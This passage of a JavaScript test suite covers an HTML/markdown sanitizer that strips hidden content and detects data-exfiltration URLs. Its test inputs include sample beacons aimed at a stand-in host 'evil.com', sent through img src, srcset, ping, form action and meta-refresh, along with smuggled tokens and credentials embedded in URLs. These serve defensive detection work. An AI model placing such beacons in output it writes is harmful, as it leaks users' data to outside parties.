        "https://cdn.example.com/a.js?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAEX%2F20240101%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240101T000000Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=" +
          hex64,
      ),
      null,
    ));
  it("leaves a base64-JWT pagination cursor alone (benign param name)", () =>
    assert.equal(
      checkExfilUrl(
        "https://api.example.com/items?cursor=eyJpZCI6MTIzNDU2Nzg5fQ&limit=50&page=3",
      ),
      null,
    ));
  it("leaves analytics params alone (utm_*/gclid)", () =>
    assert.equal(
      checkExfilUrl(
        `https://example.com/p?utm_source=news&utm_campaign=spring2024&gclid=${b64}`,
      ),
      null,
    ));
  it("suppresses the long-query heuristic when every param is benign", () =>
    assert.equal(
      checkExfilUrl(
        "https://cdn.example.com/a?X-Amz-SignedHeaders=host&X-Amz-Signature=" +
          "b".repeat(200),
      ),
      null,
    ));
  it("still flags a long query when a non-benign param is present", () =>
    assert.equal(
      checkExfilUrl("https://e.com/p?note=" + "-".repeat(200)),
      "unusually long query string",
    ));
  it("leaves a long hyphenated path slug alone (not a blob)", () =>
    assert.equal(
      checkExfilUrl("https://example.com/the-" + "quick-".repeat(40) + "end"),
      null,
    ));
  it("leaves a short non-keyword param value alone", () =>
    assert.equal(checkExfilUrl("https://e.com/p?q=hello"), null));
  it("does not throw on an unparsable URL", () =>
    assert.equal(checkExfilUrl("https://exa mple.example/p"), null));

  // ── S4: RFC 4648 url-safe base64 (`-`/`_`) blob detection ──
  // A url-safe-encoded blob: `-`/`_` in place of `+`/`/`, carrying a contiguous
  // 40+ alnum run that no hyphenated slug sustains.
  const b64url = "ab-cd_" + "Zm9vQmFyMTIzZm9vQmFyMTIzZm9vQmFyMTIzeXo0NTY";
  it("flags a base64url blob in a keyword query param (raw pre-parse scan)", () =>
    assert.equal(
      checkExfilUrl(`https://e.com/p?token=${b64url}`),
      "suspicious query parameter",
    ));
  it("flags a base64url blob in a non-keyword query param (post-parse walk)", () =>
    assert.equal(
      checkExfilUrl(`https://e.com/p?h=${b64url}`),
      "suspicious query parameter",
    ));
  it("flags a base64url blob in a fragment param", () =>
    assert.equal(
      checkExfilUrl(`https://e.com/p?a=1#data=${b64url}`),
      "suspicious query parameter",
    ));
  it("flags a long base64url blob smuggled in a path segment", () =>
    assert.equal(
      checkExfilUrl(`https://e.com/${"Zm9vQmFyMTIz".repeat(11)}-_`),
      "encoded data blob in path segment",
    ));
  // ── S4 negatives: legit url-safe shapes must still be null ──
  it("leaves a url-safe slug (hyphens, no 40-run) alone", () =>
    assert.equal(
      checkExfilUrl(
        "https://e.com/p?ref=spring-2024-promo-code-alpha-beta-gamma-delta",
      ),
      null,
    ));
  it("leaves a benign JWT-looking but separator-broken value alone", () =>
    // Three dot-separated parts, each below the 40-char blob threshold.
    assert.equal(
      checkExfilUrl(
        "https://e.com/p?ref=eyJhbGciOiJIUzI1.eyJzdWIiOiIxMjM0.SflKxwRJSMeKKF2",
      ),
      null,
    ));
  it("leaves an X-Amz signature carrying a base64url value alone (allowlisted)", () =>
    assert.equal(
      checkExfilUrl(`https://cdn.x/a?X-Amz-Signature=${b64url}`),
      null,
    ));
  it("leaves a cursor param carrying a base64url value alone (allowlisted)", () =>
    assert.equal(checkExfilUrl(`https://api.x/items?cursor=${b64url}`), null));
  it("leaves a utm_* param carrying a base64url value alone (allowlisted)", () =>
    assert.equal(checkExfilUrl(`https://x.com/p?utm_content=${b64url}`), null));
});

describe("unit: urlHost exact verdicts", () => {
  it("names the channel for a data: URI instead of echoing the payload", () =>
    assert.equal(
      urlHost("data:text/html,<b>secret</b>"),
      "(inline data: URI)",
    ));
  it("returns the real host for a non-data URL that merely contains 'data:'", () =>
    assert.equal(
      urlHost("https://evil.example/x?token=A&u=data:text/html"),
      "evil.example",
    ));
  it("returns the host of an absolute URL", () =>
    assert.equal(urlHost("https://evil.example/p?q=1"), "evil.example"));
  it("labels a relative URL", () =>
    assert.equal(urlHost("/api/log?token=x"), "(relative URL)"));
  it("labels an unparsable URL instead of throwing", () =>
    assert.equal(urlHost("https://exa mple.example/p"), "(unparsable URL)"));
  it("treats a URL that literally starts with the sentinel base as absolute", () =>
    assert.equal(urlHost("http://relative.invalid/x"), "relative.invalid"));
  it("does not treat a lookalike host sharing the sentinel prefix as relative", () =>
    assert.equal(
      urlHost("http://relative.invalid.evil.example/x?token=1"),
      "relative.invalid.evil.example",
    ));
});

describe("unit: looksLikeHtmlSource exact verdicts", () => {
  const lines = (htmlCount, total) =>
    [
      ...Array(htmlCount).fill("<a>x</a>"),
      ...Array(total - htmlCount).fill("plain text"),
    ].join("\n");
  it("needs at least 5 lines", () => {
    assert.equal(looksLikeHtmlSource(lines(4, 4)), false);
    assert.equal(looksLikeHtmlSource(lines(5, 5)), true);
  });
  it("needs strictly more than 30% HTML lines", () => {
    assert.equal(looksLikeHtmlSource(lines(3, 10)), false);
    assert.equal(looksLikeHtmlSource(lines(4, 10)), true);
  });
  it("only counts real tag-shaped lines", () =>
    assert.equal(
      looksLikeHtmlSource(["plain", "lines", "no", "tags", "here"].join("\n")),
      false,
    ));
});

describe("unit: closingTagName / isHiddenOpen exact verdicts", () => {
  it("returns the lowercased name of a well-formed closing tag", () =>
    assert.equal(closingTagName("</div>"), "div"));
  it("requires the close at the start (^ anchor)", () =>
    assert.equal(closingTagName("x</div>"), null));
  it("returns null (not a throw) for a non-closing value", () =>
    assert.equal(closingTagName("notag"), null));
  it("returns the tag name of a hidden open", () =>
    assert.equal(isHiddenOpen("<span hidden>"), "span"));
  it("returns null for a closing tag", () =>
    assert.equal(isHiddenOpen("</span>"), null));
  it("returns null for a visible open", () =>
    assert.equal(isHiddenOpen("<div>"), null));
  it("returns null for a non-tag value", () =>
    assert.equal(isHiddenOpen("notag"), null));
});

describe("unit: spliceRanges exact behavior", () => {
  const text = "0123456789";
  it("replaces a comment range with the comment placeholder", () =>
    assert.equal(
      spliceRanges(text, [{ start: 2, end: 5, kind: "comment" }]),
      `01${COMMENT_PLACEHOLDER}56789`,
    ));
  it("replaces a hidden range with the hidden placeholder", () =>
    assert.equal(
      spliceRanges(text, [{ start: 0, end: 3, kind: "hidden" }]),
      `${HIDDEN_PLACEHOLDER}3456789`,
    ));
  it("applies multiple ranges in order regardless of input order", () =>
    assert.equal(
      spliceRanges(text, [
        { start: 6, end: 8, kind: "hidden" },
        { start: 1, end: 3, kind: "comment" },
      ]),
      `0${COMMENT_PLACEHOLDER}345${HIDDEN_PLACEHOLDER}89`,
    ));
  it("merges overlapping ranges into one cut (defense-in-depth)", () =>
    assert.equal(
      spliceRanges(text, [
        { start: 2, end: 6, kind: "hidden" },
        { start: 4, end: 8, kind: "hidden" },
      ]),
      `01${HIDDEN_PLACEHOLDER}89`,
    ));
  it("orders equal-start ranges by end and merges them", () =>
    assert.equal(
      spliceRanges(text, [
        { start: 2, end: 7, kind: "hidden" },
        { start: 2, end: 4, kind: "hidden" },
      ]),
      `01${HIDDEN_PLACEHOLDER}789`,
    ));
  it("a nested range does not extend its container", () =>
    assert.equal(
      spliceRanges(text, [
        { start: 2, end: 8, kind: "hidden" },
        { start: 4, end: 6, kind: "hidden" },
      ]),
      `01${HIDDEN_PLACEHOLDER}89`,
    ));
  it("keeps adjacent (touching) ranges as separate placeholders", () =>
    assert.equal(
      spliceRanges(text, [
        { start: 2, end: 5, kind: "comment" },
        { start: 5, end: 8, kind: "comment" },
      ]),
      `01${COMMENT_PLACEHOLDER}${COMMENT_PLACEHOLDER}89`,
    ));
  it("returns the text unchanged for no ranges", () =>
    assert.equal(spliceRanges(text, []), text));
  it("a hidden range merged into a comment range keeps the hidden label (#21)", () =>
    // The comment sorts first on the start tie, so the naive merge kept its
    // kind and labeled the union "[HTML comment removed]" — understating that
    // actively-hidden content was stripped. Hidden must dominate the union.
    assert.equal(
      spliceRanges(text, [
        { start: 2, end: 5, kind: "comment" },
        { start: 4, end: 8, kind: "hidden" },
      ]),
      `01${HIDDEN_PLACEHOLDER}89`,
    ));
  it("hidden dominates an equal-start comment that sorts first (#21)", () =>
    // Equal starts sort by end ascending, so the SHORT comment range becomes
    // `last` and the longer hidden range is absorbed into it — the kind must
    // still flip to hidden.
    assert.equal(
      spliceRanges(text, [
        { start: 2, end: 4, kind: "comment" },
        { start: 2, end: 7, kind: "hidden" },
      ]),
      `01${HIDDEN_PLACEHOLDER}789`,
    ));
});

describe("unit: scanHtmlFragment exact verdicts", () => {
  it("ranges a comment and a hidden element, counts a script", () => {
    const html = `<!-- c --><script>x</script><div hidden>y</div>`;
    const { ranges, warned } = scanHtmlFragment(html);
    assert.deepEqual(ranges, [
      { start: 0, end: 10, kind: "comment" },
      { start: 28, end: 47, kind: "hidden" },
    ]);
    assert.deepEqual(warned, { tags: { script: 1 }, dataSrc: 0 });
  });
  it("an unclosed hidden element extends to the end of the fragment", () => {
    const html = `<div hidden>tail text`;
    const { ranges } = scanHtmlFragment(html);
    assert.deepEqual(ranges, [{ start: 0, end: html.length, kind: "hidden" }]);
  });
  it("counts a data: URI src", () => {
    const { warned } = scanHtmlFragment(`<img src="data:text/html,x">`);
    assert.equal(warned.dataSrc, 1);
  });
  it("does not count tags nested inside a stripped hidden element", () => {
    const { ranges, warned } = scanHtmlFragment(
      `<div hidden><script>x</script></div>`,
    );
    assert.equal(ranges.length, 1);
    assert.deepEqual(warned.tags, {});
  });
  it("does not count a plain element", () => {
    const { warned } = scanHtmlFragment("<p>x</p><script>s</script>");
    assert.deepEqual(warned, { tags: { script: 1 }, dataSrc: 0 });
  });
});

describe("unit: sanitizeHtml exact result shapes", () => {
  it("returns null for benign markup (visible tags, https img)", () =>
    assert.equal(
      sanitizeHtml('text <b>bold</b> <img src="https://e.com/l.png"> more'),
      null,
    ));
  it("reports a lone data: URI img without modifying the text", () => {
    const input = '<img src="data:text/html,x">';
    const result = sanitizeHtml(input);
    assert.equal(result.text, input);
    assert.deepEqual(result.warned, { tags: {}, dataSrc: 1 });
  });
  it("counts removed comments and hidden elements separately", () => {
    const result = sanitizeHtml("x <!-- c --> y <span hidden>s</span> z");
    assert.deepEqual(result.removed, { comments: 1, hidden: 1 });
  });
  it("accumulates warned counts across separate html blocks (mergeWarned)", () => {
    const result = sanitizeHtml("<script>a</script>\n\n<script>b</script>");
    assert.deepEqual(result.warned, { tags: { script: 2 }, dataSrc: 0 });
  });
  it("region balancing: a different inner tag neither extends nor closes the region", () =>
    assert.equal(
      applyHtml("a <span hidden>x <b>y</b> z</span> tail"),
      `a ${HIDDEN_PLACEHOLDER} tail`,
    ));
  it("region balancing: a nested same-tag element stays inside the region", () =>
    assert.equal(
      applyHtml("a <span hidden>x <span>y</span> z</span> tail"),
      `a ${HIDDEN_PLACEHOLDER} tail`,
    ));
  it("returns null when there is no HTML tag at all (gate)", () =>
    assert.equal(sanitizeHtml("plain prose, nothing to do"), null));
});

// R1: a pathologically nested fragment overflows the recursive remark/rehype
// tree walk with a RangeError. The HTML layer is the only seam the top-level
// `sanitize`/`sanitizeText` callers own, so it must fail CLOSED here rather than
// let the exception escape and break their never-throw contract.
describe("R1: parser stack overflow fails closed (never throws)", () => {
  const deeplyNested = (depth) =>
    "<div>".repeat(depth) + "x" + "</div>".repeat(depth);
  const OVERFLOW = deeplyNested(3000);

  it("sanitizeHtml withholds the input behind a placeholder instead of throwing", () => {
    const result = sanitizeHtml(OVERFLOW);
    assert.equal(result.text, UNPARSEABLE_PLACEHOLDER);
    assert.deepEqual(result.removed, { comments: 0, hidden: 1 });
    assert.deepEqual(result.warned, { tags: {}, dataSrc: 0 });
  });

  it("detectExfil returns one sentinel threat instead of throwing", () => {
    const threats = detectExfil(OVERFLOW);
    assert.equal(threats.length, 1);
    assert.equal(threats[0].target, "(unparseable HTML)");
    assert.match(threats[0].reason, /too deeply nested/);
  });

  it("top-level sanitize(html:true) never throws and returns a warned string", async () => {
    const { cleaned, found, warnings } = await sanitize(OVERFLOW, {
      html: true,
    });
    assert.equal(typeof cleaned, "string");
    assert.equal(cleaned, UNPARSEABLE_PLACEHOLDER);
    assert.ok(found.includes("hidden-html"));
    assert.ok(found.includes("exfil-urls"));
    assert.ok(warnings.length > 0);
  });

  it("property: random deeply-nested fragments never throw", () => {
    fc.assert(
      fc.property(
        fc.tuple(
          fc.constantFrom("div", "span", "p", "section", "b"),
          fc.integer({ min: 2000, max: 4000 }),
        ),
        ([tag, depth]) => {
          const nested =
            `<${tag}>`.repeat(depth) + "y" + `</${tag}>`.repeat(depth);
          // Neither exported parse-driven entry point may throw, whether or not
          // this particular depth overflows. sanitizeHtml returns null or an
          // object whose `.text` is a string; detectExfil returns null or an
          // array. The point is the absence of a thrown RangeError.
          const html = sanitizeHtml(nested);
          assert.ok(html === null || typeof html.text === "string");
          const exfil = detectExfil(nested);
          assert.ok(exfil === null || Array.isArray(exfil));
        },
      ),
      // A few deep runs are enough; each parse is expensive, so keep numRuns low.
      fcRunOptions({ numRuns: 15 }),
    );
  });
});

// Run detectExfil and assert it produced exactly one threat, returning it.
const onlyThreat = (text) => {
  const threats = detectExfil(text);
  assert.equal(threats.length, 1);
  return threats[0];
};

describe("unit: detectExfil HTML-attr + node types", () => {
  const b64 = "A".repeat(44);
  it("flags an exfil <img src> as an image without modifying anything", () =>
    assert.deepEqual(onlyThreat(`<img src="https://evil.com/x?data=${b64}">`), {
      isImage: true,
      reason: "suspicious query parameter",
      target: "evil.com",
    }));
  it("flags an exfil <a href> as a link, not an image", () =>
    assert.equal(
      onlyThreat(`<a href="https://evil.com/y?token=${b64}">c</a>`).isImage,
      false,
    ));
  it("matches an unquoted (relative) attribute value", () => {
    const threat = onlyThreat(`<img src=/u?data=${b64}>`);
    assert.equal(threat.isImage, true);
    assert.equal(threat.target, "(relative URL)");
  });
  it("matches a single-quoted attribute value", () =>
    assert.equal(
      onlyThreat(`<a href='https://evil.com/s?key=${b64}'>x</a>`).isImage,
      false,
    ));
  it("leaves a benign HTML <img> alone (gate matches, no exfil)", () =>
    assert.equal(detectExfil(`<img src="https://ok.com/logo.png">`), null));
  it("flags an exfil markdown image node as an image", () =>
    assert.equal(
      onlyThreat(`![a](https://evil.com/p.png?token=${b64})`).isImage,
      true,
    ));
  it("flags an exfil reference definition node", () =>
    assert.equal(
      onlyThreat(`[ref]: https://evil.com/d?token=${b64}\n\n[click][ref]`)
        .target,
      "evil.com",
    ));
  it("returns null for benign markdown with no exfil URL", () =>
    assert.equal(detectExfil("see [docs](https://ok.com/p)"), null));
  it("flags an exfil background attribute", () =>
    assert.equal(
      onlyThreat(
        `<table background="https://evil.com/b?data=${b64}"><tr><td>x</td></tr></table>`,
      ).target,
      "evil.com",
    ));
  it("flags an exfil srcset candidate URL (descriptor stripped)", () => {
    const threat = onlyThreat(
      `<img srcset="https://evil.com/p.png?data=${b64} 2x">`,
    );
    assert.equal(threat.isImage, true);
    assert.equal(threat.target, "evil.com");
  });
  it("parses srcset per the descriptor grammar: candidate commas split, parens and commas-in-parens do not", () => {
    // Candidate 1 has a parenthesized descriptor whose inner comma must NOT end
    // the candidate; candidate 2 (after the real separator comma) is the exfil.
    const threat = onlyThreat(
      `<img srcset="https://ok.com/a.png (foo,bar), https://evil.com/b.png?data=${b64} 2x">`,
    );
    assert.equal(threat.isImage, true);
    assert.equal(threat.target, "evil.com");
  });
  it("handles a bare srcset candidate (URL then comma, no descriptor)", () => {
    // First candidate's URL run ends in a comma (no descriptor); the second is
    // the exfil beacon.
    const threat = onlyThreat(
      `<img srcset="https://ok.com/a.png, https://evil.com/b.png?data=${b64} 2x">`,
    );
    assert.equal(threat.target, "evil.com");
  });
  it("keeps a srcset URL that itself contains commas intact (no split shredding)", () => {
    const threat = onlyThreat(
      `<img srcset="https://evil.com/b.png?a=1,2&data=${b64} 2x">`,
    );
    assert.equal(threat.target, "evil.com");
  });
  it("flags an exfil ping attribute on an anchor", () =>
    assert.equal(
      onlyThreat(`<a href="/ok" ping="https://evil.com/t?exfil=${b64}">x</a>`)
        .target,
      "evil.com",
    ));
  it("flags an off-origin form action", () =>
    assert.deepEqual(detectExfil(`<form action="https://evil.com/collect">`), [
      { isImage: false, reason: "off-origin form action", target: "evil.com" },
    ]));
  it("flags an off-origin formaction on a button", () =>
    assert.equal(
      onlyThreat(`<button formaction="https://evil.com/x">go</button>`).reason,
      "off-origin form action",
    ));
  it("leaves a same-origin (relative) form action alone", () =>
    assert.equal(detectExfil(`<form action="/submit">`), null));
  it("does not flag a form action that fails to parse (isOffOrigin catch)", () =>
    assert.equal(detectExfil(`<form action="https://exa mple.com/p">`), null));
  it("prefers the exfil-shape reason over off-origin for a form action", () =>
    assert.equal(
      onlyThreat(`<form action="https://evil.com/c?token=${b64}">`).reason,
      "suspicious query parameter",
    ));
  it("flags an off-origin meta-refresh redirect", () =>
    assert.equal(
      onlyThreat(
        `<meta http-equiv="refresh" content="0; url=https://evil.com/r">`,
      ).reason,
      "off-origin meta-refresh redirect",
    ));
  it("flags an exfil-shaped meta-refresh URL by its query", () =>
    assert.equal(
      onlyThreat(
        `<meta http-equiv="refresh" content="5;url=https://evil.com/r?data=${b64}">`,
      ).reason,
      "suspicious query parameter",
    ));
  it("preserves a ;-delimited query tail in a meta-refresh URL (no truncation at ';')", () =>
    // The blob sits AFTER a ';' in the query; the old capture truncated there and
    // dropped it (reason would degrade to the off-origin one). The full URL must
    // reach the param check.
    assert.equal(
      onlyThreat(
        `<meta http-equiv="refresh" content="5;url=https://evil.com/r?a=1;data=${b64}">`,
      ).reason,
      "suspicious query parameter",
    ));
  it("ignores a meta-refresh with no url= target (metaRefreshUrl null)", () =>
    assert.equal(detectExfil(`<meta http-equiv="refresh" content="5">`), null));
  it("ignores a meta-refresh tag with no content attribute", () =>
    assert.equal(detectExfil(`<meta http-equiv="refresh">`), null));
  it("ignores a non-refresh meta tag", () =>
    assert.equal(
      detectExfil(`<meta http-equiv="content-type" content="text/html">`),
      null,
    ));
  it("returns null when the gate matches no link/tag", () =>
    assert.equal(detectExfil("plain prose, no links or tags"), null));
});

// ─── Splice fidelity / regression cases ──────────────────────────────────────

describe("splice fidelity and regressions", () => {
  it("a stripped comment leaves surrounding bytes byte-identical", () =>
    assert.equal(
      applyHtml("prefix<!-- secret -->suffix"),
      `prefix${COMMENT_PLACEHOLDER}suffix`,
    ));
  it("a stripped hidden span leaves surrounding bytes byte-identical", () =>
    assert.equal(
      applyHtml(`prefix<span style="display:none">x</span>suffix`),
      `prefix${HIDDEN_PLACEHOLDER}suffix`,
    ));
  it("regression: a comment sharing its inline node with trailing text (list item)", () =>
    assert.equal(applyHtml("- <!-- secret -->!"), `- ${COMMENT_PLACEHOLDER}!`));
  it("regression: an unterminated trailing comment is removed to the block end", () =>
    assert.equal(
      applyHtml("- <!-- a --> x <!-- b"),
      `- ${COMMENT_PLACEHOLDER} x ${COMMENT_PLACEHOLDER}`,
    ));
  it("regression: flow html in a blockquote is spliced precisely", () =>
    assert.equal(
      applyHtml("> <div hidden>x</div>\n> visible"),
      `> ${HIDDEN_PLACEHOLDER}\n> visible`,
    ));
  it("regression: idempotent when a bogus end tag precedes a hidden element", () => {
    // parse5 (flow branch) models `</A` as a bogus comment that absorbs the
    // following `<div hidden>`, so it survives pass one; the balance walk must
    // agree or pass two would splice it — breaking idempotency.
    const input = `<div hidden=""></div> </A <div hidden=""></div>`;
    const passOne = applyHtml(input);
    assert.equal(passOne, `${HIDDEN_PLACEHOLDER} </A <div hidden=""></div>`);
    assert.equal(applyHtml(passOne), passOne);
  });
  it("regression: a bogus end tag absorbs up to the next `>`, not beyond", () => {
    // parse5 consumes `</A <span hidden>` as one bogus comment (to the first
    // `>`), so that hidden span survives; a LATER hidden span, after the `>`,
    // is back in normal content and is still spliced.
    assert.equal(
      applyHtml(`</A <span hidden>keep</span> <span hidden>gone</span> tail`),
      `</A <span hidden>keep</span> ${HIDDEN_PLACEHOLDER} tail`,
    );
  });
  it("regression: an unterminated OPEN tag absorbs the following inline html", () => {
    // `<span` (no `>`) keeps consuming as bogus attributes per parse5, so the
    // following bogus comment is absorbed, not spliced — and idempotent.
    const input = `<!bogus x> <span <!bogus y>`;
    const passOne = applyHtml(input);
    assert.equal(passOne, `${COMMENT_PLACEHOLDER} <span <!bogus y>`);
    assert.equal(applyHtml(passOne), passOne);
  });
  it("regression: absorb state crosses markdown emphasis and code-span boundaries", () => {
    // markdown puts the hidden `<div>` inside emphasis / after a code span,
    // splitting it from the absorbing `</div ` — but parse5 sees a flat stream,
    // so both must stay idempotent (the hidden div is absorbed, not spliced).
    for (const input of [
      `${COMMENT_PLACEHOLDER} </div _! <div hidden="">_</div>`,
      `${COMMENT_PLACEHOLDER} \`</div \` <div hidden=""></div>`,
    ]) {
      assert.equal(applyHtml(input), input, input);
    }
  });
  for (const [tag, body] of [
    ["style", "<!A"],
    ["script", "<!--a-->"],
    ["textarea", "</b"],
    ["title", "<!--t-->"],
  ]) {
    it(`regression: raw-text <${tag}> content is preserved verbatim, not spliced as a comment`, () => {
      // Inside RAWTEXT/RCDATA elements parse5 recognizes no markup, so a `<!…`
      // is opaque text — splicing it would mangle source these tags preserve.
      const input = `x <${tag}>${body}</${tag}> y`;
      assert.equal(applyHtml(input), input);
    });
  }
  it("regression: a hidden raw-text element is still spliced (hidden beats raw-text)", () =>
    assert.doesNotMatch(
      applyHtml("a <script hidden>SECRET</script> b"),
      /SECRET/,
    ));
  it("a reported script does not modify the text at all", () => {
    const input = "prefix<script>x</script>suffix";
    const result = sanitizeHtml(input);
    assert.equal(result.text, input);
    assert.equal(result.warned.tags.script, 1);
  });
  it("regression: a script inside an indented code block is inert, not reported", () =>
    assert.equal(sanitizeHtml("    *<script>x</script>!"), null));
  for (const close of ["</foo-bar>", "</span-x>", "</a.b>", "</ns:el>"]) {
    it(`tolerates ${close} inside a hidden removal region`, () =>
      assert.doesNotMatch(
        applyHtml(`text <span hidden>SECRET${close} more`),
        /SECRET/,
      ));
  }
  it("balances a hidden custom-element open/close, preserving trailing text", () => {
    const out = applyHtml("a <my-widget hidden>SECRET</my-widget> VISIBLE");
    assert.doesNotMatch(out, /SECRET/);
    assert.match(out, /VISIBLE/);
  });
  it("splices a hidden void element inline without eating the trailing text", () => {
    // A void element (<img>, <input>, <br>, …) emits no closing tag, so opening
    // a balance region for it would run to the container's end and delete the
    // visible text that follows. Each hidden void must be a single-node splice.
    for (const voidTag of [
      "<img hidden src=x>",
      "<input hidden>",
      "<br hidden>",
      "<hr hidden>",
    ]) {
      assert.equal(
        applyHtml(`a ${voidTag} keep me`),
        `a ${HIDDEN_PLACEHOLDER} keep me`,
        voidTag,
      );
    }
  });
  it("splices a hidden void element inside a heading, keeping the heading text", () =>
    assert.match(
      applyHtml("# title <img hidden src=x> stays"),
      /title.*stays/,
    ));
  it("does not flag a templated path segment (brace outside query/fragment)", () => {
    assert.equal(
      checkExfilUrl("https://docs.example.com/api/{{version}}/guide"),
      null,
    );
    assert.equal(checkExfilUrl("https://example.com/${HOME}/file"), null);
  });
  it("still flags a template shape in the query or fragment", () => {
    assert.equal(
      checkExfilUrl("https://e.com/p?note={{SECRET}}"),
      "suspicious query parameter",
    );
    assert.equal(
      checkExfilUrl("https://e.com/p#${TOKEN}"),
      "suspicious query parameter",
    );
  });
  it("preserves an autolink and an explicit link verbatim next to a strip", () => {
    const out = applyHtml(
      `x <span style="display:none">SECRET</span> see <https://example.com/page> and [click](https://example.com/explicit)`,
    );
    assert.doesNotMatch(out, /SECRET/);
    assert.match(out, /<https:\/\/example\.com\/page>/);
    assert.match(out, /\[click\]\(https:\/\/example\.com\/explicit\)/);
  });
  it("flags credentials smuggled in userinfo", () =>
    assert.equal(
      checkExfilUrl(
        "https://user:q9X2mN7pK4rT8wY1cV5bZ3dF6gH0jL2e@evil.example/path",
      ),
      "embedded credentials",
    ));
  it("flags a payload-shaped keyword param in the fragment", () =>
    assert.notEqual(
      checkExfilUrl(`https://ok.example/#token=${"a".repeat(64)}`),
      null,
    ));
  it("does not flag a SHORT keyword fragment param on its name alone (#20)", () =>
    assert.equal(checkExfilUrl("https://ok.example/#token=abc"), null));
  it("leaves a benign fragment anchor alone", () =>
    assert.equal(checkExfilUrl("https://ok.example/page#section-2"), null));
});

// ─── Bogus-comment parity (finding: prose branch matched only `<!--`) ─────────
//
// The HTML-source branch (parse5/rehype) strips not just proper comments but the
// HTML tokenizer's *bogus comments* (`<!…>` that is not a comment/doctype,
// `<?…>`, `<![CDATA[…]]>`). The prose/markdown branch used to scan literal
// `<!--` only, so the bogus forms survived. These cases pin the parity AND, more
// importantly, prove ordinary prose stays BYTE-FOR-BYTE untouched — the
// false-positive risk a hand-rolled bogus-comment scanner would carry.
describe("bogus-comment parity in the prose branch", () => {
  // `<!`, `<?`, and `<![CDATA[` forms each clear the HTML_TAG_PRESENT gate on
  // their own (the `<?` arm was added so a PI-only document still reaches the
  // splice); sanitizeHtml then assigns each the span the tokenizer hides.
  const SPLICED = [
    {
      name: "bogus <!declaration>",
      input: "text <!bogus secret> OK",
      want: `text ${COMMENT_PLACEHOLDER} OK`,
    },
    {
      name: "CDATA section",
      input: "note <![CDATA[ secret ]]> end",
      want: `note ${COMMENT_PLACEHOLDER} end`,
    },
    {
      name: "processing instruction beside a bogus declaration",
      input: "x <!a> and <?php evil ?> y",
      want: `x ${COMMENT_PLACEHOLDER} and ${COMMENT_PLACEHOLDER} y`,
    },
    {
      name: "PI-only document (cleared by the <? gate arm)",
      input: "before <?php evil ?> after",
      want: `before ${COMMENT_PLACEHOLDER} after`,
    },
    {
      name: "a proper comment beside a bogus one",
      input: "x <!bogus> y <!-- c --> z",
      want: `x ${COMMENT_PLACEHOLDER} y ${COMMENT_PLACEHOLDER} z`,
    },
  ];
  for (const { name, input, want } of SPLICED)
    it(`splices ${name}`, () => assert.equal(applyHtml(input), want));

  // The precision counter-examples. Every one of these is visible text a browser
  // renders; not a single byte may be touched. (Several never produce an inline
  // html node at all — micromark leaves them literal — which is exactly why the
  // scan is safe; the assertion pins that end-to-end.)
  const UNTOUCHED = [
    "a < b",
    "x<3",
    "if (x<y) {",
    "1<2 && 3>2",
    "<not a tag",
    "a bare < here",
    "see <https://example.com> for more",
    "use the `<Foo>` component in a code span",
    "<Foo>visible element body</Foo>",
    "a doctype <!DOCTYPE html> is dropped by the parser, not spliced",
  ];
  for (const input of UNTOUCHED)
    it(`leaves ${JSON.stringify(input)} byte-for-byte`, () =>
      assert.equal(applyHtml(input), input));
});

// ─── looksLikeHtmlSource branch-parity (finding #2) ──────────────────────────
//
// `sanitizeHtml` routes through one of two scanners — `scanHtmlFragment`
// (parse5, when `looksLikeHtmlSource` is true) or `scanMarkdown` (remark, the
// prose branch) — based on a coarse 30%-of-lines heuristic. After the
// bogus-comment parity fix, the SAME hidden/bogus construct must be stripped no
// matter which branch the heuristic happens to pick; otherwise an attacker tunes
// the surrounding line-shape to dodge whichever branch is weaker. This property
// embeds one construct (carrying a canary) in BOTH a tag-dense doc (forces the
// source branch) and a prose doc (forces the markdown branch) and asserts the
// canary dies in both while a visible marker survives in both.
describe("property: hidden/bogus content is stripped on either branch (#2)", () => {
  const CANARY = "CANARY_PARITY";
  const MARKER = "VISIBLE_MARKER";

  // Each builds a fragment that hides CANARY; the HTML-source branch already
  // strips all of these, so the property pins the prose branch up to parity.
  const hiddenConstruct = fc.constantFrom(
    `<!-- ${CANARY} -->`,
    `<!bogus ${CANARY}>`,
    `<![CDATA[${CANARY}]]>`,
    `<span style="display:none">${CANARY}</span>`,
    `<div hidden>${CANARY}</div>`,
  );

  it("the canary never survives, the visible marker always does", () => {
    let sawSourceBranch = 0;
    let sawProseBranch = 0;
    fc.assert(
      fc.property(hiddenConstruct, (construct) => {
        // Tag-dense doc: ≥5 lines, >30% tag-shaped → source branch.
        const sourceDoc = [
          "<section>",
          "<p>intro</p>",
          `<p>${MARKER}</p>`,
          construct,
          "<p>outro</p>",
          "</section>",
        ].join("\n");
        // Prose doc: a single paragraph of plain text → markdown branch.
        const proseDoc = `Here is ${MARKER} then ${construct} and more prose.`;

        assert.equal(looksLikeHtmlSource(sourceDoc), true);
        assert.equal(looksLikeHtmlSource(proseDoc), false);
        if (looksLikeHtmlSource(sourceDoc)) sawSourceBranch += 1;
        if (!looksLikeHtmlSource(proseDoc)) sawProseBranch += 1;

        for (const doc of [sourceDoc, proseDoc]) {
          const out = applyHtml(doc);
          assert.equal(
            out.includes(CANARY),
            false,
            `canary survived: ${JSON.stringify(doc)} -> ${JSON.stringify(out)}`,
          );
          assert.ok(
            out.includes(MARKER),
            `visible marker lost: ${JSON.stringify(doc)} -> ${JSON.stringify(out)}`,
          );
        }
      }),
      fcRunOptions({ numRuns: 200 }),
    );
    assert.ok(
      sawSourceBranch > 0 && sawProseBranch > 0,
      "a branch was never exercised",
    );
  });

  // Precision counterpart: aria-hidden is visible on the rendered page (it
  // only removes an element from the accessibility tree), so it must NOT be
  // spliced on either branch — the opposite of the hiddenConstruct property
  // above.
  it("an aria-hidden-only construct survives byte-for-byte on either branch", () => {
    const ariaConstruct = `<span aria-hidden="true">${CANARY}</span>`;
    const sourceDoc = [
      "<section>",
      "<p>intro</p>",
      `<p>${MARKER}</p>`,
      ariaConstruct,
      "<p>outro</p>",
      "</section>",
    ].join("\n");
    const proseDoc = `Here is ${MARKER} then ${ariaConstruct} and more prose.`;
    assert.equal(looksLikeHtmlSource(sourceDoc), true);
    assert.equal(looksLikeHtmlSource(proseDoc), false);
    for (const doc of [sourceDoc, proseDoc]) {
      const out = applyHtml(doc);
      assert.ok(out.includes(CANARY), `aria-hidden content spliced: ${doc}`);
